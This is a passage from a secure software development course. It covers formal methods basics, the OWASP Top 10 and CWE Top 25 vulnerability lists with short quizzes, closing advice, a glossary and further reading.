Before we do that, we need to make one thing clear: Formal methods always require assumptions. If the assumptions are false then their conclusions don’t necessarily hold. For example, you could prove that something is true if the CPU works correctly; a bug in the CPU means that the proof does not hold in that case. That does not make formal methods useless, because they can eliminate many other problems, and you can choose what to assume. But it is important to remember that when someone says “something is proven” that it is really proven given some assumptions… and it is important to understand what those assumptions are.

#### Formal Methods Levels

Because of the extra effort, formal methods are often applied to a subset of components or specific properties that are especially important. Formal methods can also be applied to various degrees. There is varying terminology on these degrees, but one way is these three levels:

*   **Level 0**<br>A formal specification is created (that is, mathematically-based techniques are used to rigorously describe what the program is supposed to do). The program is then informally developed from it. This is sometimes called *formal methods lite*. This approach can help remove some ambiguities.

*   **Level 1**<br>Apply level 0 and then prove some select properties from that or do a formal refinement from specification towards something that will become the program.

*   **Level 2**<br>Fully prove the claims of a program, including mechanically checking it. This provides the strongest results, but also requires the most effort.

#### How Can Math Be Applied?

There are many different ways to apply mathematics, and so there are many different ways to use formal methods. Let’s briefly look at a few common math concepts that are used in formal methods.

##### Boolean Expressions

A widely-used tool is the idea of boolean expressions. These expressions are true or false, and can include various *propositional connectives* (a proposition is simply something that is either true or false). Here are common propositional connectives. The first three should be very familiar to you, since programming languages copied them from mathematics, but their traditional mathematical notation might be new to you:

1.  “x and y” (mathematical “x ∧ y”) is true if both x and y are true, otherwise it is false.

2.  “x or y” (mathematical “x ∨ y”) is true if either or both x and y are true; if both are false it is false.

3.  “not x” (mathematical “￢x”) is true if x is false, and it is false if x is true.

4.  “x→y” is true if x is false *or* if y is true, that is, x → y is the same as ((not x) or y). The arrow is often read as “implies”. This operator may be new to you, but this arrow simply represents “if x is true then y is true”. It is formally called *material implication*.

5.  “x↔y” is true if x and y have the same value. This is basically “are these values equal” for boolean values. It is sometimes read as “if and only if” (iff).

You may find it easier to understand the connectives by looking at the following table. This table shows the results of these connectives given the possible input values of x and y (in this table T is true while F is false):

Propositional Connectives

<table>
  <tr>
    <th>x</th>
    <th>y</th>
    <th>x ∧ y</th>
    <th>x ∨ y</th>
    <th>￢x</th>
    <th>x→y</th>
    <th>x&harr;y</th>
  </tr>
  <tr>
    <th>F</th>
    <th>F</th>
    <td>F</td>
    <td>F</td>
    <td>T</td>
    <td>T</td>
    <td>T</td>
  </tr>
  <tr>
    <th>F</th>
    <th>T</th>
    <td>F</td>
    <td>T</td>
    <td>T</td>
    <td>T</td>
    <td>F</td>
  </tr>
  <tr>
    <th>T</th>
    <th>F</th>
    <td>F</td>
    <td>T</td>
    <td>F</td>
    <td>F</td>
    <td>F</td>
  </tr>
  <tr>
    <th>T</th>
    <th>T</th>
    <td>T</td>
    <td>T</td>
    <td>F</td>
    <td>T</td>
    <td>T</td>
  </tr>
</table>

##### Sets

Another widely-used mathematical tool is the idea of sets. A set is simply an unordered collection of elements, where elements themselves may be sets. For example, if you say S = {4, 5, 6}, that just means that set S has 3 elements (specifically 4, 5, and 6). You can then apply various operations to sets, for example:

*   The operation “A ∈ B” returns true if and only if the left-hand-side A is a member of the right-hand-side B. So given the previous definition of S, “4 ∈ S” is true (because 4 is a member of S), while “7 ∈ S” is false (because 7 is not a member of S).

*   The operation “A⊂B” returns true if and only if set A is a subset of set B. Put another way, A⊂B is true if every member of A is also a member of B. So {4,6}⊂S is true, because both 4 and 6 are members of S.

##### Quantifiers

A widely-used mathematical tool that you may not have seen is the idea of *quantifiers*. These return true or false values based on certain conditions:

*   ∀ X *expression* : This is true if and only if the *expression* is always true for all allowed values of X. It essentially “loops” over every value X could be. The ∀ (an upside-down A) is read as “for all”. This lets you easily state that something is always true.

*   ∃ X *expression* : This is true if and only if there is some allowed value of X where the *expression* is true. The ∃ is read as “there exists”. This lets you easily state that something occurs at least once.

This means you can use expressions like “∀ X (valid(X) → well_formed(X))” to say “for all values of X, if X is valid then X is well-formed”... or put another way, if X is valid then X is well-formed. Note that this entire expression is true if we are discussing XML data.

##### Mathematical Statements vs. the Real World

Mathematical statements can be used to model the real world, but do not confuse mathematical statements as being the same as the real world!

In particular, you can easily create mathematical statements that are not what you really mean. For example, natural languages sometimes use “and” and “or” in a way different from what we defined above. This is especially a problem for “or”, which in mathematics and computing is true when both sides are true (aka “inclusive or”), but in natural language it is sometimes implied that only one will be true (aka “exclusive or”). For example, in the phrase “we will go to the movies or a play tonight”, the speaker probably does not mean that we could do *both*. Using mathematics can remove many ambiguities like this, but you will have to decide if that expression is what you *mean*. The time-tested way to counter this problem is to have others review your statements and discuss if that is what was intended.

#### Formal Methods Tools

There are a huge number of tools that support formal methods.

Practically any tool (even a word processor!) can be used to capture requirements in a rigorous formal way. Some tools are designed to do just this. An example of such tools is Alloy, which is designed to make it easy to formally capture requirements and do some quick checks.

Some tools are also designed to verify that claims are mathematically true. Major kinds are:

*   *Theorem-provers*<br>These try to prove goals given assumptions using only a sequence of allowed rules. Some are fully automated while others are interactive. The interactive tools can handle harder problems but are generally harder to use.

    *   Widely-used OSS automated theorem provers include E and SPASS.

    *   Widely-used OSS interactive theorem provers include Coq and Isabelle.

*   *Satisfiability (SAT) solvers / SAT modulo theories (SMT)*<br>These take a bunch of equations with variables, and try to find a set of values for those variables that makes all equations true. SAT solvers only handle boolean variables and boolean equations, while SMT solvers can handle other values. Some package managers internally use a SAT solver. Widely-used OSS SMT solvers include Z3, CVC4, and Alt-Ergo-Free.

*   *Model-checkers*<br>These take a model and “exhaustively” show it is true in all cases, using many optimization tricks to make that practical. A widely-used OSS generic model checker is Spin (which supports a language called ProMeLa). There are also many model-checking tools specifically designed to analyze programs. For example, CBMC is an OSS bounded model checker for C and C++ programs that can verify memory safety, check for ex­cep­tions, check for various variants of undefined behavior, and supports user-specified as­ser­tions.

*   *Abstract interpretation / symbolic execution (for programs)*<br>These “execute” programs using relevant simplifications (abstract interpretation) or symbols (symbolic execution).

There are some systems that can combine these tools. For example:

*   The Why3/Frama-C ecosystem combines a suite of tools for proving programs correct.

*   Temporal Logic of Actions+ (TLA+) is a general-purpose formal specification language that is particularly useful for describing concurrent and distributed systems, and has a variety of supporting tools.

#### Formal Methods and the Future

Today formal methods are only used in special circumstances, but they might become more prominent in the future. Our goal has been to simply make you aware of it, in case you decide that it might be worth pursuing further in the future. You cannot consider using an approach if you have never heard of it.

#### Quiz 4.4: Formal Methods

\>>Select the true statement(s):<<

\[!x] The expression “∀ X foo” is true if *foo* is true no matter what the value of X is.

\[ ] Formal methods eliminate assumptions. {{ selected: Not at all. Any formal method has to start with some assumptions. }}

\[x] A Satisfiability (SAT) solver takes a bunch of boolean variables and boolean expressions, and tries to find a set of boolean variable values where all the boolean expressions are true.

\[x] A model-checker takes a model and tries to exhaustively show it’s true in all cases.

## Top Vulnerability Lists

### OWASP Top 10

We noted earlier that there are two widely-used lists of “top” vulnerabilities, the OWASP Top 10 (focusing on web application security risks) and the CWE Top 25. They identify what they perceive as the “top” items in terms of being especially common and especially dangerous.

Their different scopes result in many differences. For example, the CWE Top 25 lists buffer overflows, while the OWASP Top 10 does not, because buffer overflows are a common serious problem in some domains (such as embedded systems) but they are not common in web applications.

Here is the [*OWASP Top 10*](https://owasp.org/Top10/) (2021 edition) list of categories:

1.  Broken Access Control
2.  Cryptographic Failures
3.  Injection
4.  Insecure Design
5.  Security Misconfiguration
6.  Vulnerable and Outdated Components
7.  Identification and Authentication Failures
8.  Software and Data Integrity Failures
9.  Security Logging and Monitoring Failures
10. Server Side Request Forgery (SSRF)

In this course we have covered all of the OWASP Top 10, in both the [2017](https://owasp.org/www-project-top-ten/2017/Top\_10) and [2021](https://owasp.org/Top10/) editions, and included cross-references when we did.

#### Quiz 4.5: OWASP Top 10

\>>Select the true statement(s):<<

\[!x] Injection is a risk listed in the 2021 OWASP Top 10.

\[x] Security Misconfiguration is a risk listed in the 2021 OWASP Top 10.

\[ ] Buffer overflows are in the 2021 OWASP Top 10. {{ selected: No, and it is understandable if you missed this. Buffer overflows are very common in embedded systems, because they are widely implemented in C and C++ which provide little protection against buffer overflows. Most web applications are written in other programming languages that protect against buffer overflows, and thus they have relatively rare in web applications. }}

### CWE Top 25

Here is the 2021 edition of the [CWE Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/archive/2019/2019\_cwe_top25.html). This list was created using real-world data, specifically, the publicly known vulnerabilities with Common Vulnerabilities and Exposures (CVE) as published in the National Institute of Standards and Technology (NIST) National Vulnerability Database (NVD), including the severity scores as calculated using the Common Vulnerability Scoring System (CVSS) scores. This list combines many different kinds of software; whether or not that is good depends on your perspective.

No system is perfect. A complication is that the CWEs identified here are at various hierarchical levels. For example, #17 [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*) is a superset of both #3 [CWE-125](https://cwe.mitre.org/data/definitions/125.html) (*Out-of-bounds read*) and #1 [CWE-787](https://cwe.mitre.org/data/definitions/787.html) (*Out-of-bounds Write*), yet they are all listed here. Still, this does provide a defensible and repeatable approach for identifying what’s important.

#### Top 25

<table>
  <tr>
   <td>Rank</td>
   <td>ID</td>
   <td>Name</td>
  </tr>
  <tr>
   <td>[1]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787</a></td>
   <td>Out-of-bounds Write</td>
  </tr>
  <tr>
   <td>[2]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79</a></td>
   <td>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</td>
  </tr>
  <tr>
   <td>[3]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/125.html">CWE-125</a></td>
   <td>Out-of-bounds Read</td>
  </tr>
  <tr>
   <td>[4]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20</a></td>
   <td>Improper Input Validation</td>
  </tr>
  <tr>
   <td>[5]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78</a></td>
   <td>Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</td>
  </tr>
  <tr>
   <td>[6]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a></td>
   <td>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</td>
  </tr>
  <tr>
   <td>[7]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/416.html">CWE-416</a></td>
   <td>Use After Free</td>
  </tr>
  <tr>
   <td>[8]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></td>
   <td>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</td>
  </tr>
  <tr>
   <td>[9]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a></td>
   <td>Cross-Site Request Forgery (CSRF)</td>
  </tr>
  <tr>
   <td>[10]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434</a></td>
   <td>Unrestricted Upload of File with Dangerous Type</td>
  </tr>
  <tr>
   <td>[11]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/306.html">CWE-306</a></td>
   <td>Missing Authentication for Critical Function</td>
  </tr>
  <tr>
   <td>[12]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190</a></td>
   <td>Integer Overflow or Wraparound</td>
  </tr>
  <tr>
   <td>[13]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a></td>
   <td>Deserialization of Untrusted Data</td>
  </tr>
  <tr>
   <td>[14]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a></td>
   <td>Improper Authentication</td>
  </tr>
  <tr>
   <td>[15]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/476.html">CWE-476</a></td>
   <td>NULL Pointer Dereference</td>
  </tr>
  <tr>
   <td>[16]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td>
   <td>Use of Hard-coded Credentials</td>
  </tr>
  <tr>
   <td>[17]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a></td>
   <td>Improper Restriction of Operations within the Bounds of a Memory Buffer</td>
  </tr>
  <tr>
   <td>[18]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/862.html">CWE-862</a></td>
   <td>Missing Authorization</td>
  </tr>
  <tr>
   <td>[19]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/276.html">CWE-276</a></td>
   <td>Incorrect Default Permissions</td>
  </tr>
  <tr>
   <td>[20]
   </td>
   <td><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200</a></td>
   <td>Exposure of Sensitive Information to an Unauthorized Actor</td>
  </tr>
  <tr>
   <td>[21]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522</a></td>
   <td>Insufficiently Protected Credentials</td>
  </tr>
  <tr>
   <td>[22]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/732.html">CWE-732</a></td>
   <td>Incorrect Permission Assignment for Critical Resource</td>
  </tr>
  <tr>
   <td>[23]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611</a></td>
   <td>Improper Restriction of XML External Entity Reference</td>
  </tr>
  <tr>
   <td>[24]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
   <td>Server-Side Request Forgery (SSRF)</td>
  </tr>
  <tr>
   <td>[25]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77</a></td>
   <td>Improper Neutralization of Special Elements used in a Command ('Command Injection')</td>
  </tr>
</table>

#### On the Cusp

The developers of the CWE Top 25 felt that there were a number of weaknesses that were important, but did not manage to be in their top 25 because they were not as prevalent or tended to be less severe. They call these weaknesses *on the cusp*.

Developers that complete mitigation and risk decision-making on the 2021 CWE Top 25 may want to look for these other weaknesses potentially present in their software. For these reasons, users of the 2021 CWE Top 25 should seriously consider including these additional weaknesses in their analyses:

<table>
  <tr>
   <td>Rank</td>
   <td>ID</td>
   <td>Name</td>
  </tr>
  <tr>
   <td>[26]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/295.html">CWE-295</a></td>
   <td>Improper Certificate Validation</td>
  </tr>
  <tr>
   <td>[27]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></td>
   <td>Uncontrolled Resource Consumption</td>
  </tr>
  <tr>
   <td>[28]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a></td>
   <td>Improper Control of Generation of Code ('Code Injection')</td>
  </tr>
  <tr>
   <td>[29]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/269.html">CWE-269</a></td>
   <td>Improper Privilege Management</td>
  </tr>
  <tr>
   <td>[30]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/917.html">CWE-917</a></td>
   <td>Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')</td>
  </tr>
  <tr>
   <td>[31]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/59.html">CWE-59</a></td>
   <td>Improper Link Resolution Before File Access ('Link Following')</td>
  </tr>
  <tr>
   <td>[32]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/401.html">CWE-401</a></td>
   <td>Missing Release of Memory after Effective Lifetime</td>
  </tr>
  <tr>
   <td>[33]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/362.html">CWE-362</a></td>
   <td>Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')</td>
  </tr>
  <tr>
   <td>[34]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/427.html">CWE-427</a></td>
   <td>Uncontrolled Search Path Element</td>
  </tr>
  <tr>
   <td>[35]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319</a></td>
   <td>Cleartext Transmission of Sensitive Information</td>
  </tr>
  <tr>
   <td>[36]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/843.html">CWE-843</a></td>
   <td>Access of Resource Using Incompatible Type ('Type Confusion')</td>
  </tr>
  <tr>
   <td>[37]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
   <td>URL Redirection to Untrusted Site ('Open Redirect')</td>
  </tr>
  <tr>
   <td>[38]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
   <td>Incorrect Authorization</td>
  </tr>
  <tr>
   <td>[39]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/532.html">CWE-532</a></td>
   <td>Inclusion of Sensitive Information in Log Files</td>
  </tr>
  <tr>
   <td>[40]</td>
   <td><a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770</a></td>
   <td>Allocation of Resources Without Limits or Throttling</td>
  </tr>
</table>

You will be glad to know that this set of courses has, at least briefly, discussed each one of these kinds of vulnerabilities, even the ones “on the cusp”,
for both the [2019](https://cwe.mitre.org/top25/archive/2019/2019\_cwe_top25.html) and [2021](https://cwe.mitre.org/top25/archive/2021/2021\_cwe_top25.html) editions of the CWE Top 25 list.

#### Quiz 4.6: CWE Top 25

\>>Select the true statement(s):<<

\[!x]  The 2021 CWE Top 25 Most Dangerous Software Errors list was created using real-world data about vulnerabilities combined with their severity scores

\[x]  The 2021 CWE Top 25 Most Dangerous Software Errors list is a combination of all kinds of software.

\[ ] The CWEs listed in the 2021 CWE Top 25 Most Dangerous Software Errors do not overlap each other. {{ selected: No, there are CWEs that overlap. For example, CWE-119 (“Improper Restriction of Operations within the Bounds of a Memory Buffer”) is a superset of both CWE-125 (“Out-of-bounds read”) and CWE-787 (“Out-of-bounds Write”). }}

## Concluding Notes

### Conclusions

The goal of this course is to help you develop secure software. We hope you feel far more prepared to counter attackers.

As you develop your software:

*   Consider its security requirements. Make sure you know what it is supposed to do... and *NOT* do.

*   Design for security. Constantly consider design principles, like least privilege and non-bypassability.

*   Implement for security. In particular, counter common kinds of mistakes. Simply countering common kinds of vulnerabilities is not enough to create a secure system, but it is a big step forward. Knowing the common kinds of implementation mistakes will also help you become aware of other kinds of vulnerabilities as well.

*   Verify. In particular, use tools to detect problems *before* you ship. Where you can, enable tools as soon as you can and make sure they are in your continuous integration (CI) pipeline.

*   Field and promptly handle vulnerability reports.

In real life security is a process - a journey - and not a simple endpoint. We hope that this course has made you far more prepared to take this journey. We wish you the best as you develop software that will help protect people’s reputation, property, and even lives.

# Part III: Final Exam

*   Not included as part of the free version of the course.

# Part IV: Supporting Materials Not Part of the Course

# Glossary

Attacker: A person who attacks computer systems.

Hardening a system: Modifying a system so that defects are less likely to become security vulnerabilities.

Hacker: “a person who delights in having an intimate understanding of the internal workings of a system, computers and computer networks in particular.” ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983))

# Further Reading

(Not part of the course per se)

Many others discuss how to develop secure software. This course merely covers the fundamentals (as we see them). Here are some resources:

*   “Secure Software Design and Programming: Class Materials” by David A. Wheeler - <https://dwheeler.com/secure-class/> - lecture materials for a graduate class at George Mason University (GMU). This is a graduate class, so it goes into more detail.

*   “Secure Programming HOWTO” - book by David A. Wheeler - <https://dwheeler.com/secure-programs/>

*   “Fundamental Practices for Secure Software Development, Third Edition” from SAFECode. SAFECode has published other useful materials, e.g., “Managing Security Risks Inherent in the Use of Third-party Components” and “Practices for Secure Development of Cloud Applications” - <https://safecode.org/publications/>

*   Secure Programming with Static Analysis by Brian Chess & Jacob West

*   Official (ISC)2 Guide to the CSSLP CBK ((ISC)2 Press), Paul, Mano

*   Mitigating the Risk of Software Vulnerabilities by Adopting a Secure Software Development Framework (SSDF), NIST, <https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04232020.pdf>

*   Building Security In Maturity Model (BSIMM) <<https://www.bsimm.com/>>

*   The BSA Framework for Secure Software <https://www.bsa.org/files/reports/bsa_software_security_framework_web_final.pdf>

*   OWASP Secure Coding Practices-Quick Reference Guide <https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/migrated_content>

*   [Software Supply Chain Best Practices](https://github.com/cncf/tag-security/raw/main/supply-chain-security/supply-chain-security-paper/CNCF_SSCP_v1.pdf) from the Cloud Native Computing Foundation (CNCF)

# Old Mappings

## OWASP Top 10 and CWE Top 25

### OWASP Top 10 (2017 edition)

Here is the OWASP *Top 10 Web Application Security Risks* (2017 edition); please read this list to make sure you understand each one:

1.  *“Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.*

2.  *Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.*

3.  *Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes.* *Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser.*

4.  *XML External Entities (XXE). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.*

5.  *Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.*

6.  *Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion.*

7.  *Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.*

8.  *Insecure Deserialization. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks.*

9.  *Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.*

10. *Insufficient Logging & Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.”*

### CWE Top 25 (2019 edition)

Here is the 2019 edition of the [CWE Top 25 Most Dangerous Software Errors](https://cwe.mitre.org/top25/archive/2019/2019\_cwe_top25.html). This list was created using real-world data, specifically, the publicly known vulnerabilities with Common Vulnerabilities and Exposures (CVE) as published in the National Institute of Standards and Technology (NIST) National Vulnerability Database (NVD), including the severity scores as calculated using the Common Vulnerability Scoring System (CVSS) scores. This list combines many different kinds of software; whether or not that is good depends on your perspective.

No system is perfect. A complication is that the CWEs identified here are at various hierarchical levels. For example, #1 [CWE-119](https://cwe.mitre.org/data/definitions/119.html) (*Improper Restriction of Operations within the Bounds of a Memory Buffer*) is a superset of both #5 [CWE-125](https://cwe.mitre.org/data/definitions/125.html) (*Out-of-bounds read*) and #12 [CWE-787](https://cwe.mitre.org/data/definitions/787.html) (*Out-of-bounds Write*), yet they are all listed here. Still, this does provide a defensible and repeatable approach for identifying what’s important.

#### Top 25 (2019)

<table>
  <tr>
    <td>Rank</td>
    <td>ID</td>
    <td>Name</td>
  </tr>
  <tr>
    <td>[1]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/119.html">CWE-119</a></td>
    <td>Improper Restriction of Operations within the Bounds of a Memory Buffer</td>
  </tr>
  <tr>
    <td>[2]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79</a></td>
    <td>Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</td>
  </tr>
  <tr>
    <td>[3]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20</a></td>
    <td>Improper Input Validation</td>
  </tr>
  <tr>
    <td>[4]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200</a></td>
    <td>Information Exposure</td>
  </tr>
  <tr>
    <td>[5]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/125.html">CWE-125</a></td>
    <td>Out-of-bounds Read</td>
  </tr>
  <tr>
    <td>[6]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89</a></td>
    <td>Improper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’)</td>
  </tr>
  <tr>
    <td>[7]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/416.html">CWE-416</a></td>
    <td>Use After Free</td>
  </tr>
  <tr>
    <td>[8]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/190.html">CWE-190</a></td>
    <td>Integer Overflow or Wraparound</td>
  </tr>
  <tr>
    <td>[9]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352</a></td>
    <td>Cross-Site Request Forgery (CSRF)</td>
  </tr>
  <tr>
    <td>[10]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22</a></td>
    <td>Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</td>
  </tr>
  <tr>
    <td>[11]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78</a></td>
    <td>Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</td>
  </tr>
  <tr>
    <td>[12]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787</a></td>
    <td>Out-of-bounds Write</td>
  </tr>
  <tr>
    <td>[13]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a></td>
    <td>Improper Authentication</td>
  </tr>
  <tr>
    <td>[14]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/476.html">CWE-476</a></td>
    <td>NULL Pointer Dereference</td>
  </tr>
  <tr>
    <td>[15]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/732.html">CWE-732</a></td>
    <td>Incorrect Permission Assignment for Critical Resource</td>
  </tr>
  <tr>
    <td>[16]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/434.html">CWE-434</a></td>
    <td>Unrestricted Upload of File with Dangerous Type</td>
  </tr>
  <tr>
    <td>[17]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/611.html">CWE-611</a></td>
    <td>Improper Restriction of XML External Entity Reference</td>
  </tr>
  <tr>
    <td>[18]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94</a></td>
    <td>Improper Control of Generation of Code (‘Code Injection’)</td>
  </tr>
  <tr>
    <td>[19]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td>
    <td>Use of Hard-coded Credentials</td>
  </tr>
  <tr>
    <td>[20]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a></td>
    <td>Uncontrolled Resource Consumption</td>
  </tr>
  <tr>
    <td>[21]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/772.html">CWE-772</a></td>
    <td>Missing Release of Resource after Effective Lifetime (!)</td>
  </tr>
  <tr>
    <td>[22]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/426.html">CWE-426</a></td>
    <td>Untrusted Search Path (!)</td>
  </tr>
  <tr>
    <td>[23]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502</a></td>
    <td>Deserialization of Untrusted Data</td>
  </tr>
  <tr>
    <td>[24]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/269.html">CWE-269</a></td>
    <td>Improper Privilege Management</td>
  </tr>
  <tr>
    <td>[25]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/295.html">CWE-295</a></td>
    <td>Improper Certificate Validation</td>
  </tr>
</table>

Ones marked with (!) are in the 2019 edition but not the 2021 edition.

#### On the Cusp (2019)

The developers of the CWE Top 25 felt that there were a number of weaknesses that were important, but did not manage to be in their top 25 because they were not as prevalent or tended to be less severe. They call these weaknesses *on the cusp*.

Developers that complete mitigation and risk decision-making on the 2019 CWE Top 25 may want to look for these other weaknesses potentially present in their software. For these reasons, users of the 2019 CWE Top 25 should seriously consider including these additional weaknesses in their analyses:

<table>
  <tr>
    <td>Rank</td>
    <td>ID</td>
    <td>Name</td>
  </tr>
  <tr>
    <td>[26]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/835.html">CWE-835</a></td>
    <td>Loop with Unreachable Exit Condition (‘Infinite Loop’) (!)</td>
  </tr>
  <tr>
    <td>[27]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/522.html">CWE-522</a></td>
    <td>Insufficiently Protected Credentials</td>
  </tr>
  <tr>
    <td>[28]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/704.html">CWE-704</a></td>
    <td>Incorrect Type Conversion or Cast (!)</td>
  </tr>
  <tr>
    <td>[29]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/362.html">CWE-362</a></td>
    <td>Concurrent Execution using Shared Resource with Improper Synchronization (‘Race Condition’)</td>
  </tr>
  <tr>
    <td>[30]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></td>
    <td>Server-Side Request Forgery (SSRF)</td>
  </tr>
  <tr>
    <td>[31]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/415.html">CWE-415</a></td>
    <td>Double Free (!)</td>
  </tr>
  <tr>
    <td>[32]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/601.html">CWE-601</a></td>
    <td>URL Redirection to Untrusted Site (‘Open Redirect’)</td>
  </tr>
  <tr>
    <td>[33]</td>
    <td><a href="https://cwe.mitre.org/data/definitions/863.html">CWE-863</a></td>
    <td>Incorrect Authorization</td>
